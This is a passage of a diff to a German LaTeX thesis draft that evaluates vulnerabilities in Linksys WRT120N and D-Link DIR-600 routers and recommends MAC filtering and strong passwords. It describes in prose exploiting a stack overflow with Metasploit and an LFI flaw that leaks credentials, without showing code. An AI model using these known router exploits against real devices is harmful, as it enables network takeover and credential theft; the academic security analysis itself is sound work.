+	Dies ist mit geringem Aufwand möglich und erfordert keine besondere Voraussetzung.
+
+	Die fehlende Validierung der Parameter stellt ein potenzielles Risiko dar, konnte im Rahmen
+	der Analyse jedoch nicht zu einer konkreten Schwachstelle weitergeführt werden.
+
+	% --------------ToDo--------------------%
+	% Formatierung schön machen 
+	% Bilder einfügen
+	% Telnet voll fertig schreiben
+	% WIRESHARK wichtig
+	% Passwort testing auf der Webseite
+	% Quellen korrekt einfügen auch im Text
+	% --------------------------------------%
 	
 	\chapter{Evaluierung}
 	Ziel dieser Arbeit war es, Schwachstellen der beiden Router zu analysieren, 
@@ -1892,6 +2105,30 @@ rescue ::Rex::ConnectionError
 	wurden jeweils unmittelbar nach der Durchführung ausgewertet und hinsichtlich 
 	ihrer Auswirkungen auf die Sicherheit analysiert. Im Folgenden werden die 
 	wichtigsten Erkenntnisse der kritischen Schwachstellen zusammengefasst.
+
+	Die Schwachstelle des WRT120N von Linksys, welche einen Stack-Overflow auslöst ist ebenfalls
+	als sehr kritisch einzuschätzen, da diese Zugang zu allen Einstellungen des Routers hatte
+	und somit auch die Einstellungen dementsprechen manipulieren kann, dass die
+	Geräte des eigentlichen Nutzers nicht mehr sich mit dem WLAN verbinden
+	können. Lediglich ein manueller Reset des Routers, durchgeführt von einem 
+	Nutzer, der physischen Zugriff auf den Router hat, kann diese kompromittierten
+	Einstellungen rückgängig machen. Sollte ein Angreifer sich daraufhin
+	wieder Zugriff zum WLAN verschaffen kann der Angriff wiederholt werden.
+	Nach langem Ausprobieren des Pythonskripts, welches sich nicht erfolgreich
+	ausführen lies, war das Ausführen der Schwachstelle über das Programm
+	Metasploit sehr einfach. Daraus lässt sich ableiten, dass ein Angreifer
+	mit entsprechenden Tools, einfach bekannte Schwachstellen ausnutzen kann.
+	Bei der Schwachstelle des WRT120N \cite{cverecordcve2014125122} muss der
+	Angreifer sich im WLAN des Routers befinden, dies könnte durch die 
+	Konfiguration einer Liste erlaubter MAC-Adressen erschwert werden, in
+	der sich lediglich die bekannten MAC-Adressen des Router Besitzers 
+	befinden. Wie im Test \ref{w_wlan_settings} beschrieben, haben MAC-Adressen, 
+	die sich nicht auf dieser Liste befinden keine Möglichkeit ein Passwort für
+	den Zugang in WLAN einzugeben. Damit wird auch die Möglichkeit des
+	Einsatz eines Passwortknackers ausgeschlossen. Sollte diese Liste nicht
+	genutzt werden, sollte zwingend ein starkes Passwort gewählt werden.
+	Unabhängig von dieser Schwachstelle ist diese Maßnahme von hoher Bedeutung.
+
 
 	Am kritischten Einzuschätzten ist beim DIR-600 Router von D-Link die LFI-Schwachstelle, da sie 
 	einem Angreifer Zugriff auf sensible Daten, insbesonder der Benutzername und das 
@@ -1916,29 +2153,6 @@ rescue ::Rex::ConnectionError
 	Sollte der Angreifer durch Umgehen der Sicherheitsvorkehrungen Zugiff zu dem
 	Netzwerk erhalten, kann er die Schwachstelle unaufhaltsam ausnutzen.
 	
-	Die Schwachstelle des WRT120N von Linksys, welche einen Stack-Overflow auslöst ist ebenfalls
-	als sehr kritisch einzuschätzen, da diese Zugang zu allen Einstellungen des Routers hatte
-	und somit auch die Einstellungen dementsprechen manipulieren kann, dass die
-	Geräte des eigentlichen Nutzers nicht mehr sich mit dem WLAN verbinden
-	können. Lediglich ein manueller Reset des Routers, durchgeführt von einem 
-	Nutzer, der physischen Zugriff auf den Router hat, kann diese kompromittierten
-	Einstellungen rückgängig machen. Sollte ein Angreifer sich daraufhin
-	wieder Zugriff zum WLAN verschaffen kann der Angriff wiederholt werden.
-	Nach langem Ausprobieren des Pythonskripts, welches sich nicht erfolgreich
-	ausführen lies, war das Ausführen der Schwachstelle über das Programm
-	Metasploit sehr einfach. Daraus lässt sich ableiten, dass ein Angreifer
-	mit entsprechenden Tools, einfach bekannte Schwachstellen ausnutzen kann.
-	Bei der Schwachstelle des WRT120N \cite{cverecordcve2014125122} muss der
-	Angreifer sich im WLAN des Routers befinden, dies könnte durch die 
-	Konfiguration einer Liste erlaubter MAC-Adressen erschwert werden, in
-	der sich lediglich die bekannten MAC-Adressen des Router Besitzers 
-	befinden. Wie im Test \ref{w_wlan_settings} beschrieben, haben MAC-Adressen, 
-	die sich nicht auf dieser Liste befinden keine Möglichkeit ein Passwort für
-	den Zugang in WLAN einzugeben. Damit wird auch die Möglichkeit des
-	Einsatz eines Passwortknackers ausgeschlossen. Sollte diese Liste nicht
-	genutzt werden, sollte zwingend ein starkes Passwort gewählt werden.
-	Unabhängig von dieser Schwachstelle ist diese Maßnahme von hoher Bedeutung.
-
 	% 
 	%=======================notes jf - need to be deleted later
 	% Wie lang muss die Evaluierung sein? 
@@ -1987,7 +2201,7 @@ rescue ::Rex::ConnectionError
 	Bewertung des Ergebnisses sowohl hinsichtlich des Schweregrades als auch der 
 	Auswirkungen auf die Nutzer des WLANs. Die Untersuchungen zeigten, dass Router 
 	Schwachstellen mit den geeigneten
-	Tools und hinreichendem Wissen ausgenutzt werden könnne, sodass dadurch die
+	Tools und hinreichendem Wissen ausgenutzt werden können, sodass dadurch die
 	Sicherheit der Daten der Nutzer des WLANs gefährdet sind. 
 	Da die Nutzung eines Routers zu Hause für die meisten Personen unabdingbar ist,
 	sollten gerade deshalb die Anweisungen der Routerhersteller umgesetzt werden. 
